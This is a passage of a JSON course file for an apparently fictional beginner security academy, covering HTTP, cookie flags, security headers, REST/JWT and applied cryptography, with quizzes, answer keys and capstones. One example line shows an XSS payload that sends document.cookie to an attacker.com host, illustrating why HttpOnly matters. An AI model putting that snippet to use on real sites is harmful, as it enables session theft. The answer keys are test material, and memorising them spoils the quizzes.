      "simulatedOutput": "HTTP/1.1 200 OK\nDate: Thu, 19 Nov 2026 03:00:00 GMT\nContent-Type: application/json; charset=utf-8\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff"
    },
    "terminalCommands": [
      {
        "command": "curl -I https://api.calion.academy/health",
        "output": "HTTP/1.1 200 OK\nDate: Thu, 19 Nov 2026 03:00:00 GMT\nContent-Type: application/json; charset=utf-8\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff"
      },
      {
        "command": "curl -s https://api.calion.academy/health | jq .",
        "output": "{\n  \"status\": \"healthy\",\n  \"version\": \"2.1.0\",\n  \"authenticated\": false\n}"
      }
    ],
    "objectives": [
      "Deconstruct HTTP requests, responses, methods (GET, POST, PUT, DELETE), and status codes",
      "Configure defensive cookie security attributes: HttpOnly, Secure, and SameSite",
      "Inspect network traffic and security response headers using browser developer tools",
      "Understand REST API architecture, JSON payloads, and token-based authentication (Bearer JWT)"
    ],
    "lessons": [
      {
        "id": "ps-task-10-01",
        "taskNumber": 1,
        "title": "The HTTP Protocol: Requests, Methods & Status Codes",
        "objectives": [
          "Deconstruct the anatomy of an HTTP request (method, URI, headers, body)",
          "Explain the semantic role of HTTP methods: GET, POST, PUT, DELETE, and HEAD",
          "Interpret the 5 major HTTP status code classes (1xx, 2xx, 3xx, 4xx, 5xx)"
        ],
        "concept": "The Hypertext Transfer Protocol (HTTP) is an application-layer, stateless request-response protocol powering the World Wide Web.\n\nHTTP Request Anatomy:\n1. Request Line: METHOD /path/resource HTTP/1.1 (e.g. GET /index.html HTTP/1.1).\n2. Request Headers: Key-value metadata (Host, User-Agent, Accept, Authorization).\n3. Blank Line (CRLF).\n4. Message Body (Optional): Payload containing form submissions, JSON, or uploaded files.\n\nPrimary HTTP Methods:\n- GET: Retrieves resource data from the server. Idempotent; parameters sent in URL query string.\n- POST: Submits new data to the server for processing (e.g., login credentials, form data).\n- PUT: Creates or replaces an entire targeted resource.\n- DELETE: Requests removal of a resource.\n- HEAD: Identical to GET, but returns ONLY response headers without the message body (useful for auditing server types and file sizes quickly).\n\nHTTP Response Status Codes:\n- 1xx (Informational): 101 Switching Protocols (WebSockets).\n- 2xx (Success): 200 OK, 201 Created, 204 No Content.\n- 3xx (Redirection): 301 Moved Permanently, 302 Found (Temporary Redirect).\n- 4xx (Client Errors): 400 Bad Request, 401 Unauthorized (Authentication required), 403 Forbidden (Authenticated but lacking permission), 404 Not Found.\n- 5xx (Server Errors): 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable.",
        "whyItMatters": "Differentiating 401 Unauthorized (missing credentials) from 403 Forbidden (permission denied) is fundamental when analyzing broken object-level authorization (BOLA) vulnerabilities.",
        "examples": [
          "401 Unauthorized: Returned when an API request lacks a valid Bearer token.",
          "403 Forbidden: Returned when a standard student user attempts to access /admin/users."
        ],
        "commands": [
          {
            "cmd": "curl -I https://example.com",
            "desc": "Send HEAD request to inspect HTTP response headers and status code"
          }
        ],
        "exercise": {
          "prompt": "Inspect HTTP headers from the simulated CALION API health endpoint using 'curl -I https://api.calion.academy/health':",
          "command": "curl -I https://api.calion.academy/health",
          "expectedOutput": "HTTP/1.1 200 OK\nDate: Thu, 19 Nov 2026 03:00:00 GMT\nContent-Type: application/json; charset=utf-8\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff"
        },
        "reviewSummary": {
          "coreTakeaway": "HTTP is stateless; methods (GET, POST) specify actions, while 3-digit status codes indicate outcomes (2xx success, 4xx client error, 5xx server error).",
          "learningOutcome": "Mastered HTTP request/response lifecycles, methods, and status code classifications."
        }
      },
      {
        "id": "ps-task-10-02",
        "taskNumber": 2,
        "title": "Session Management & Security Cookie Flags",
        "objectives": [
          "Explain why stateless HTTP requires session tokens or cookies to maintain login state",
          "Analyze the Set-Cookie response header and its security attributes",
          "Evaluate how HttpOnly, Secure, and SameSite mitigate XSS and CSRF attacks"
        ],
        "concept": "Because HTTP is fundamentally stateless (the server treats every subsequent request as completely unrelated to previous ones), web applications utilize Session Identifiers stored in HTTP Cookies to track logged-in users.\n\nWhen a user logs in, the server generates a cryptographically random session token and transmits it to the browser via the Set-Cookie response header:\nSet-Cookie: session_id=abc123xyz; Path=/; Domain=calion.academy; Secure; HttpOnly; SameSite=Strict\n\nCritical Cookie Security Flags:\n1. HttpOnly Flag:\n- Crucial XSS Defense. Prevents client-side scripts from reading the cookie via document.cookie.\n- If an attacker injects a Cross-Site Scripting (XSS) payload, the browser refuses to expose the session cookie to the malicious script.\n\n2. Secure Flag:\n- Enforces Transport Encryption. Instructs the browser to ONLY transmit the cookie across encrypted HTTPS connections.\n- Prevents session hijacking over unencrypted plaintext HTTP or public Wi-Fi networks.\n\n3. SameSite Flag (Strict / Lax / None):\n- Primary CSRF (Cross-Site Request Forgery) defense.\n- SameSite=Strict: The cookie is NEVER sent in cross-site requests (e.g. following a link from an external attacker site).\n- SameSite=Lax: Sent when navigating to the site via top-level GET requests, but blocked on cross-site POST submissions.",
        "whyItMatters": "Failing to set HttpOnly and Secure flags on authentication cookies leaves session tokens vulnerable to trivial theft via XSS and network sniffing.",
        "examples": [
          "XSS Cookie Theft: Without HttpOnly, an attacker executing fetch('https://attacker.com/?c=' + document.cookie) steals active sessions.",
          "CSRF Defense: SameSite=Strict blocks malicious auto-submitting forms from transferring funds."
        ],
        "commands": [
          {
            "cmd": "curl -i -c cookie.txt https://api.calion.academy/health",
            "desc": "Inspect Set-Cookie headers and save cookie jar"
          }
        ],
        "exercise": {
          "prompt": "Inspect the Set-Cookie header flags in a simulated response: 'echo \"Set-Cookie: session_id=token123; Secure; HttpOnly; SameSite=Strict\"':",
          "command": "echo 'Set-Cookie: session_id=token123; Secure; HttpOnly; SameSite=Strict'",
          "expectedOutput": "Set-Cookie: session_id=token123; Secure; HttpOnly; SameSite=Strict"
        },
        "reviewSummary": {
          "coreTakeaway": "Cookies maintain session state; HttpOnly blocks XSS credential theft, Secure enforces HTTPS, and SameSite blocks CSRF.",
          "learningOutcome": "Mastered cookie security architecture and session protection attributes."
        }
      },
      {
        "id": "ps-task-10-03",
        "taskNumber": 3,
        "title": "HTTP Request/Response Headers & Browser DevTools",
        "objectives": [
          "Inspect live HTTP headers using Browser Developer Tools (Network Tab)",
          "Analyze common request headers (User-Agent, Authorization, Host, Content-Type)",
          "Implement security hardening headers (CSP, HSTS, X-Content-Type-Options)"
        ],
        "concept": "HTTP headers are colon-separated name-value pairs transmitted in requests and responses that govern caching, authentication, content types, and security policies.\n\nCore Request Headers:\n- Host: Defines the domain name of the server being requested (mandatory in HTTP/1.1; allows virtual hosting).\n- User-Agent: Identifies client browser and OS platform.\n- Authorization: Transmits credentials or Bearer tokens (e.g. Authorization: Bearer <jwt>).\n- Content-Type: Specifies MIME type of the payload (e.g. application/json, application/x-www-form-urlencoded).\n\nEssential Security Hardening Headers:\n1. Strict-Transport-Security (HSTS): Instructs browsers to ONLY connect via HTTPS, preventing SSL-stripping attacks:\n   Strict-Transport-Security: max-age=31536000; includeSubDomains\n2. Content-Security-Policy (CSP): Restricts which domains and sources can execute scripts, images, and frames on the page, mitigating XSS:\n   Content-Security-Policy: default-src 'self'\n3. X-Content-Type-Options: nosniff: Prevents MIME-sniffing attacks where browsers execute HTML hidden inside uploaded images.",
        "whyItMatters": "Auditing HTTP headers with browser DevTools (F12 -> Network Tab) reveals missing security protections and exposed technology versions (e.g. Server: Apache/2.4.41).",
        "examples": [
          "Browser DevTools: Pressing F12 in Chrome/Firefox -> Network -> Headers reveals request and response parameters.",
          "HSTS Preloading: Hardcoding domains into browser source code to guarantee HTTPS on the very first connection."
        ],
        "commands": [
          {
            "cmd": "curl -sI https://api.calion.academy/health | grep -i 'strict-transport-security'",
            "desc": "Check if HSTS header is configured"
          }
        ],
        "exercise": {
          "prompt": "Verify the presence of the HSTS security header using 'echo \"Strict-Transport-Security: max-age=31536000\" | grep Strict':",
          "command": "echo 'Strict-Transport-Security: max-age=31536000' | grep Strict",
          "expectedOutput": "Strict-Transport-Security: max-age=31536000"
        },
        "reviewSummary": {
          "coreTakeaway": "HTTP headers configure client-server behavior; security headers like HSTS and CSP harden browsers against SSL-stripping and XSS.",
          "learningOutcome": "Mastered HTTP header auditing, DevTools Network inspection, and security header configurations."
        }
      },
      {
        "id": "ps-task-10-04",
        "taskNumber": 4,
        "title": "REST API Fundamentals & Web Authentication",
        "objectives": [
          "Explain Representational State Transfer (REST) principles and resource endpoints",
          "Deconstruct JSON payloads and API response schemas",
          "Contrast API Keys, Basic Authentication, and Bearer JSON Web Tokens (JWT)"
        ],
        "concept": "Modern web applications and mobile apps communicate with backend servers via REST (Representational State Transfer) APIs exchanging structured JSON (JavaScript Object Notation) data.\n\nREST Principles:\n- Resources are identified by predictable URI paths: /api/v1/users or /api/v1/users/42.\n- Standard HTTP verbs define actions:\n  - GET /users -> List users\n  - POST /users -> Create new user\n  - GET /users/42 -> Retrieve user 42\n  - PUT /users/42 -> Update user 42\n  - DELETE /users/42 -> Delete user 42\n\nAPI Authentication Mechanisms:\n1. API Keys: Static tokens passed via query strings (?api_key=...) or headers (X-API-Key: ...). Simple, but difficult to rotate and lack expiration.\n2. HTTP Basic Authentication: Transmits username:password base64-encoded in the Authorization header (Authorization: Basic YWRtaW46cGFzczEyMw==). Highly vulnerable without HTTPS.\n3. Bearer Tokens / JSON Web Tokens (JWT):\n   Clients authenticate once with credentials; server returns a signed JWT. The client passes this token in the header:\n   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n   A JWT consists of three dot-separated base64-encoded parts: Header.Payload.Signature. The server validates the cryptographic signature without querying a database on every request.",
        "whyItMatters": "APIs frequently suffer from broken authentication, excessive data exposure, and missing function-level authorization (OWASP API Security Top 10).",
        "examples": [
          "Testing an API with curl: curl -X POST -H 'Content-Type: application/json' -d '{\"user\":\"cadet\"}' https://api.site.com/login.",
          "JWT structure: Header (algorithm), Payload (claims/user ID/expiry), Signature (HMAC-SHA256)."
        ],
        "commands": [
          {
            "cmd": "curl -s -X GET https://api.calion.academy/health | jq .",
            "desc": "Send GET request to API and parse JSON response"
          }
        ],
        "exercise": {
          "prompt": "Test generating an API Authorization header representation in the terminal:",
          "command": "echo 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.test.sig'",
          "expectedOutput": "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.test.sig"
        },
        "reviewSummary": {
          "coreTakeaway": "REST APIs manage resources via standard verbs and JSON payloads; Bearer JWT tokens provide stateless signed authentication.",
          "learningOutcome": "Mastered REST API endpoints, JSON communication, and JWT authentication models."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-10-01",
        "taskId": "ps-task-10-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "Which 3-digit HTTP status code indicates that the request was rejected due to missing or invalid authentication credentials?",
        "canonicalAnswer": "401",
        "acceptedAnswers": [
          "401",
          "401 Unauthorized"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Client error status code.",
          "401 stands for Unauthorized."
        ],
        "hint": "3-digit client error for Unauthorized...",
        "explanation": "HTTP status code 401 Unauthorized indicates that the request requires HTTP authentication or that provided credentials were invalid.",
        "xp": 25
      },
      {
        "id": "ps-q-10-02",
        "taskId": "ps-task-10-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "Which HTTP cookie attribute prevents client-side JavaScript (e.g. document.cookie) from accessing the cookie value?",
        "canonicalAnswer": "httponly",
        "acceptedAnswers": [
          "httponly",
          "HttpOnly",
          "http-only",
          "HTTPOnly"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _",
        "answerLength": 8,
        "hints": [
          "Ensures the cookie is accessed via HTTP/S only.",
          "Combines 'http' and 'only'."
        ],
        "hint": "HttpOnly flag...",
        "explanation": "The HttpOnly cookie attribute prevents client-side JavaScript from accessing the cookie, effectively mitigating session theft via Cross-Site Scripting (XSS).",
        "xp": 25
      },
      {
        "id": "ps-q-10-03",
        "taskId": "ps-task-10-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "What HTTP response security header instructs modern browsers to connect to the site exclusively via HTTPS and reject unencrypted HTTP?",
        "canonicalAnswer": "strict-transport-security",
        "acceptedAnswers": [
          "strict-transport-security",
          "hsts",
          "HSTS",
          "Strict-Transport-Security"
        ],
        "visualSlots": "_ _ _ _ _ _ - _ _ _ _ _ _ _ _ _ - _ _ _ _ _ _ _ _",
        "answerLength": 25,
        "hints": [
          "Commonly abbreviated as HSTS.",
          "Three hyphenated words: strict-transport-..."
        ],
        "hint": "strict-transport-security (HSTS)...",
        "explanation": "HTTP Strict Transport Security (HSTS, Strict-Transport-Security header) forces browsers to use secure HTTPS connections and prohibits SSL stripping.",
        "xp": 25
      },
      {
        "id": "ps-q-10-04",
        "taskId": "ps-task-10-04",
        "taskIndex": 3,
        "type": "exact",
        "question": "In HTTP Authorization headers for REST APIs, which scheme keyword is prefixed before a JSON Web Token (JWT)?",
        "canonicalAnswer": "bearer",
        "acceptedAnswers": [
          "bearer",
          "Bearer",
          "BEARER"
        ],
        "visualSlots": "_ _ _ _ _ _",
        "answerLength": 6,
        "hints": [
          "Authorization: ... <token>",
          "Starts with 'bear'."
        ],
        "hint": "Authorization: Bearer <token>...",
        "explanation": "The Bearer authentication scheme (RFC 6750) prefixes the token string: 'Authorization: Bearer <token>', indicating the bearer of the token possesses access rights.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 10 Capstone Assessment: Web Security Architecture & Defense",
      "scenario": "A financial web application handles customer funds. A security auditor tests for Cross-Site Scripting (XSS) by injecting an alert script. The auditor discovers that even though an attacker can execute JavaScript on the page, the attacker's script cannot steal the active session token stored in the cookie.",
      "taskId": "ps-task-10-assessment",
      "question": {
        "id": "ps-q-10-capstone",
        "type": "choice",
        "question": "Which cookie security attribute specifically prevented the injected JavaScript from accessing document.cookie?",
        "options": [
          "HttpOnly",
          "SameSite=None",
          "Domain=.bank.com",
          "Max-Age=3600"
        ],
        "correctIndex": 0,
        "hints": [
          "Recall which flag forbids browser JavaScript DOM APIs from reading the cookie.",
          "Combines 'http' and 'only'."
        ],
        "hint": "HttpOnly attribute...",
        "explanation": "Setting the HttpOnly flag on a session cookie prevents browser JavaScript from reading document.cookie, successfully thwarting credential theft via XSS.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-11",
    "legacyId": "room-11",
    "order": 11,
    "stageId": "ps-stage-04",
    "stageTitle": "Web Security & Applied Cryptography",
    "stageOrder": 4,
    "title": "Applied Cryptography, Hashes & Public Key Infrastructure",
    "tagline": "Symmetric vs Asymmetric Encryption, Hash Primitives, PKI & OpenSSL Operations",
    "description": "Understand modern applied cryptography: symmetric ciphers (AES), asymmetric ciphers (RSA, ECC), cryptographic hashing (SHA-256), the avalanche effect, digital certificates, and hands-on OpenSSL operations.",
    "difficulty": "Foundational",
    "estimatedMinutes": 40,
    "xp": 50,
    "prerequisites": [
      "ps-room-10"
    ],
    "whyAreYouHere": "Cryptography protects data in transit and data at rest. Cybersecurity engineers must understand the mathematical guarantees and operational boundaries of ciphers, hashes, and digital certificates.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"260\" height=\"135\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"150\" y=\"45\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Symmetric (AES-256)</text><rect x=\"40\" y=\"65\" width=\"220\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"150\" y=\"87\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Shared Single Secret Key</text><text x=\"150\" y=\"125\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Encrypt = Decrypt with same key</text><rect x=\"320\" y=\"20\" width=\"260\" height=\"135\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"450\" y=\"45\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Asymmetric (RSA / ECC)</text><rect x=\"335\" y=\"65\" width=\"110\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#10b981\"/><text x=\"390\" y=\"87\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Public Key</text><rect x=\"455\" y=\"65\" width=\"110\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#ef4444\"/><text x=\"510\" y=\"87\" fill=\"#f87171\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Private Key</text><text x=\"450\" y=\"125\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Public encrypts; Private decrypts</text></svg>",
    "tryInteractive": {
      "expectedCommand": "echo -n 'CALION' | sha256sum",
      "simulatedOutput": "6bb46d29622d1feec7354972e2cf6bdf63e007871b656715f3ec60f8ba95ec8e  -"
    },
    "terminalCommands": [
      {
        "command": "echo -n 'CALION' | sha256sum",
        "output": "6bb46d29622d1feec7354972e2cf6bdf63e007871b656715f3ec60f8ba95ec8e  -"
      },
      {
        "command": "openssl version",
        "output": "OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2)"
      }
    ],
    "objectives": [
      "Contrast symmetric ciphers (AES) with asymmetric key pair algorithms (RSA, ECC)",
      "Explain the properties of cryptographic hash functions (one-way, collision resistance, avalanche effect)",
      "Describe Public Key Infrastructure (PKI), Certificate Authorities (CAs), and X.509 certificates",
      "Perform practical cryptographic checksum verification and OpenSSL certificate operations"
    ],
    "lessons": [
      {
        "id": "ps-task-11-01",
        "taskNumber": 1,
        "title": "Symmetric vs Asymmetric Cryptography",
        "objectives": [
          "Compare the mathematical mechanics of symmetric and asymmetric encryption",
          "Evaluate the key distribution challenge inherent in symmetric cryptography",
          "Explain how hybrid encryption (TLS) combines asymmetric key exchange with symmetric bulk encryption"
        ],
        "concept": "Cryptography provides confidentiality by transforming readable plaintext into unreadable ciphertext.\n\n1. Symmetric Cryptography (Shared Secret):\n- A single cryptographic key is used for BOTH encryption and decryption.\n- Algorithms: Advanced Encryption Standard (AES-128, AES-256), ChaCha20.\n- Advantages: Computationally fast; low CPU overhead; ideal for encrypting gigabytes of data on disk or in transit.\n- Disadvantage: The Key Distribution Problem. How do two parties across the untrusted internet securely share the secret key without an eavesdropper intercepting it?\n\n2. Asymmetric Cryptography (Public-Key Cryptography):\n- Utilizes mathematically linked Key Pairs: a Public Key (freely distributed) and a Private Key (kept strictly confidential).\n- Principles:\n  - Confidentiality: Anyone can encrypt a message using Alice's Public Key; ONLY Alice's Private Key can decrypt it.\n  - Digital Signatures: Alice signs a document with her Private Key; anyone with her Public Key can verify authenticity and non-repudiation.\n- Algorithms: RSA (2048/4096-bit), Elliptic Curve Cryptography (ECC / ECDSA).\n- Disadvantage: Computationally intensive (~1,000x slower than symmetric AES).\n\nHybrid Cryptography (TLS / HTTPS):\nModern protocols combine both: Asymmetric cryptography (ECDHE) negotiates a temporary shared session key during the initial handshake, which is then used by symmetric AES-GCM to encrypt bulk payload data at wire speed.",
        "whyItMatters": "Hybrid cryptography protects all modern web browsing, banking transactions, and virtual private networks (VPNs).",
        "examples": [
          "Symmetric cipher: BitLocker and LUKS full-disk encryption using AES-256.",
          "Asymmetric cipher: SSH key pairs (id_ed25519 and id_ed25519.pub) for server authentication."
        ],
        "commands": [
          {
            "cmd": "openssl ciphers -v 'TLSv1.3'",
            "desc": "Display supported symmetric and asymmetric cipher suites in TLS 1.3"
          }
        ],
        "exercise": {
          "prompt": "Verify OpenSSL version and supported algorithms in the terminal sandbox:",
          "command": "openssl version",
          "expectedOutput": "OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2)"
        },
        "reviewSummary": {
          "coreTakeaway": "Symmetric encryption uses one fast shared key; asymmetric encryption uses public/private pairs; TLS combines both.",
          "learningOutcome": "Mastered symmetric and asymmetric ciphers and hybrid TLS encryption."
        }
      },
      {
        "id": "ps-task-11-02",
        "taskNumber": 2,
        "title": "Cryptographic Hash Functions & Public Key Infrastructure (PKI)",
        "objectives": [
          "Define the mathematical properties of a cryptographic hash function (one-way, deterministic, fixed length)",
          "Demonstrate the Avalanche Effect where changing 1 input bit completely changes output",
          "Trace the Certificate Authority (CA) trust chain validating X.509 digital certificates"
        ],
        "concept": "A Cryptographic Hash Function is a mathematical algorithm that maps arbitrary-length input data into a fixed-length hexadecimal digest.\n\nEssential Properties:\n1. One-Way (Pre-image Resistance): Infeasible to calculate input data from the hash digest.\n2. Deterministic: The exact same input always produces the exact same digest.\n3. Collision Resistance: Mathematically infeasible to find two distinct inputs (A != B) that yield Hash(A) == Hash(B).\n4. Avalanche Effect: Changing a single bit in the input radically alters more than 50% of the output bits, making hashes unpredictable.\n\nHash Standard Status:\n- MD5 (128-bit) & SHA-1 (160-bit): Cryptographically BROKEN due to practical collision attacks. Deprecated.\n- SHA-2 (SHA-256, SHA-512) & SHA-3: Industry standard for file integrity, password hashing (with salts), and blockchain.\n\nPublic Key Infrastructure (PKI) & Digital Certificates:\nHow does your browser know that google.com's public key actually belongs to Google and not an impostor?\n- Certificate Authorities (CAs): Trusted third parties (DigiCert, Let's Encrypt) whose root certificates are pre-installed in browsers and operating systems.\n- X.509 Digital Certificates: Bind an organization's identity and domain name to their public key, cryptographically signed by a trusted CA.",
        "whyItMatters": "Hashes verify that downloaded software patches have not been tampered with; PKI certificates guarantee that users are connecting to legitimate servers rather than phishing proxies.",
        "examples": [
          "File Integrity: Comparing sha256sum output against vendor-published hash before installing software.",
          "Certificate Expiration: A certificate whose validity period has elapsed triggers browser security warning screens."
        ],
        "commands": [
          {
            "cmd": "echo -n 'test' | sha256sum",
            "desc": "Calculate SHA-256 hash of a string"
          },
          {
            "cmd": "echo -n 'Test' | sha256sum",
            "desc": "Demonstrate the avalanche effect with a single capital letter change"
          }
        ],
        "exercise": {
          "prompt": "Calculate the SHA-256 hash of 'CALION' using 'echo -n \"CALION\" | sha256sum':",
          "command": "echo -n 'CALION' | sha256sum",
          "expectedOutput": "6bb46d29622d1feec7354972e2cf6bdf63e007871b656715f3ec60f8ba95ec8e  -"
        },
        "reviewSummary": {
          "coreTakeaway": "Cryptographic hashes verify data integrity via one-way avalanche digests; PKI trust chains validate public keys using CA signatures.",
          "learningOutcome": "Mastered cryptographic hashing primitives, collision resistance, and PKI trust hierarchies."
        }
      },
      {
        "id": "ps-task-11-03",
        "taskNumber": 3,
        "title": "Practical Cryptographic Operations with OpenSSL & Hashes",
        "objectives": [
          "Calculate and verify file checksums on Linux using sha256sum and md5sum",
          "Inspect remote SSL/TLS certificate chains and expiration dates using openssl s_client",
          "Explain how password storage requires salted, slow adaptive hashing functions (bcrypt, Argon2)"
        ],
        "concept": "Practical cryptographic operations require using standard command-line tools to audit certificates and verify data integrity:\n\n1. Checksum Verification:\nWhen downloading software (e.g. an operating system ISO or security binary):\n- sha256sum downloaded_file.iso calculates the hash.\n- sha256sum -c checksums.txt automatically compares hashes against a list and reports 'OK' or 'FAILED'.\n\n2. OpenSSL Certificate Inspection:\nSecurity engineers query live TLS endpoints to verify certificate chains and supported ciphers:\nopenssl s_client -connect calion.academy:443 -servername calion.academy\nThis outputs the full certificate chain, issuer CA, Subject Alternative Names (SAN), and negotiated cipher suite.\n\n3. Password Hashing vs Data Hashing:\nStandard hashes (SHA-256, MD5) are designed to be fast. However, for storing passwords, fast hashes are DANGEROUS because GPUs can compute billions of guesses per second.\nPassword hashing requires:\n- Salt: Random bytes prepended to each password to defeat precomputed Rainbow Tables.\n- Adaptive Slow Hashes (bcrypt, scrypt, Argon2, PBKDF2): Mathematically parameterized with work factors (iterations, memory cost) to make brute-force hardware cracking cost-prohibitive.",
        "whyItMatters": "Breaches involving unsalted MD5 hashes allow attackers to crack millions of passwords in minutes; Argon2 and bcrypt protect passwords even after database theft.",
        "examples": [
          "Verifying file checksum: sha256sum -c SHA256SUMS.txt.",
          "Checking certificate expiration: openssl x509 -enddate -noout -in cert.pem."
        ],
        "commands": [
          {
            "cmd": "echo 'password123' | sha256sum",
            "desc": "Illustrate why fast hashes are unsuitable for password storage without salts"
          }
        ],
        "exercise": {
          "prompt": "Run a SHA-256 integrity calculation test in the terminal sandbox:",
          "command": "echo 'integrity test' | sha256sum",
          "expectedOutput": "76d8b2488a0e88cf730302b1c4125a073f13fb4fec5b51a5ddbe29a7373f721c  -"
        },
        "reviewSummary": {
          "coreTakeaway": "sha256sum verifies file integrity; openssl audits TLS certificates; passwords require salted adaptive slow algorithms (bcrypt/Argon2).",
          "learningOutcome": "Mastered OpenSSL certificate operations, checksum verification, and password storage hygiene."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-11-01",
        "taskId": "ps-task-11-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "In asymmetric cryptography, which key in the mathematically linked key pair must be kept strictly confidential by the owner?",
        "canonicalAnswer": "private key",
        "acceptedAnswers": [
          "private key",
          "private",
          "Private Key",
          "Private"
        ],
        "visualSlots": "_ _ _ _ _ _ _   _ _ _",
        "answerLength": 11,
        "hints": [
          "Public key is shared openly; ... key is kept secret.",
          "Two words: private ..."
        ],
        "hint": "Two words: private ...",
        "explanation": "In asymmetric cryptography, the Private Key must remain strictly confidential with the owner to decrypt messages and generate digital signatures.",
        "xp": 25
      },
      {
        "id": "ps-q-11-02",
        "taskId": "ps-task-11-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "Which cryptographic property describes when modifying a single input bit drastically changes the resulting hash output?",
        "canonicalAnswer": "avalanche effect",
        "acceptedAnswers": [
          "avalanche effect",
          "avalanche",
          "Avalanche Effect",
          "Avalanche effect"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _ _   _ _ _ _ _ _",
        "answerLength": 16,
        "hints": [
          "Named after a snowslide tumbling down a mountain.",
          "Two words: avalanche ..."
        ],
        "hint": "Avalanche effect...",
        "explanation": "The Avalanche Effect ensures that even a microscopic 1-bit alteration in input data flips more than 50% of the output digest bits, preventing pattern analysis.",
        "xp": 25
      },
      {
        "id": "ps-q-11-03",
        "taskId": "ps-task-11-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "What standard Linux command-line utility calculates and verifies 256-bit SHA-2 cryptographic hash checksums for files?",
        "canonicalAnswer": "sha256sum",
        "acceptedAnswers": [
          "sha256sum",
          "SHA256SUM"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _ _",
        "answerLength": 9,
        "hints": [
          "Combines 'sha256' with 'sum'.",
          "One word: sha256..."
        ],
        "hint": "sha256sum utility...",
        "explanation": "sha256sum is the standard POSIX utility for computing and verifying SHA-256 cryptographic checksums of files and streams.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 11 Capstone Assessment: Applied Cryptography & Verification Synthesis",
      "scenario": "A systems administrator downloads a critical security patch 'kernel-update.tar.gz' from an external mirror. The vendor published the authoritative SHA-256 checksum on their official website. The administrator runs sha256sum on the downloaded archive and verifies that the output matches the vendor's published hash character-for-character.",
      "taskId": "ps-task-11-assessment",
      "question": {
        "id": "ps-q-11-capstone",
        "type": "exact",
        "question": "Which core pillar of the CIA Triad has the administrator mathematically proven by verifying that the file was not altered or corrupted in transit?",
        "canonicalAnswer": "integrity",
        "acceptedAnswers": [
          "integrity",
          "Integrity"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _ _",
        "answerLength": 9,
        "hints": [
          "One of the three pillars of the CIA Triad.",
          "Starts with 'integ'."
        ],
        "hint": "The 'I' in the CIA Triad...",
        "explanation": "Verifying cryptographic hash checksums guarantees Data Integrity: proving that the file was not modified, corrupted, or tampered with by an adversary in transit.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-12",
    "legacyId": "room-12",
    "order": 12,
    "stageId": "ps-stage-04",
    "stageTitle": "Web Security & Applied Cryptography",
    "stageOrder": 4,
    "title": "The CIA Triad, Threat Landscape & Defensive Posture",
    "tagline": "Confidentiality, Integrity, Availability, Attack Surfaces, Least Privilege & Zero Trust",
    "description": "Synthesize the entire Pre-Security journey: the CIA Triad, threat actor taxonomy, attack surface analysis, foundational defense principles (Least Privilege, Defense-in-Depth, Zero Trust), and practical defensive decision making.",
    "difficulty": "Foundational",
    "estimatedMinutes": 45,
    "xp": 50,
    "prerequisites": [
      "ps-room-11"
    ],
    "whyAreYouHere": "Technical tools are meaningless without a coherent defensive strategy. This capstone room unifies hardware, operating systems, networking, and web security into a practical defense-in-depth posture.",
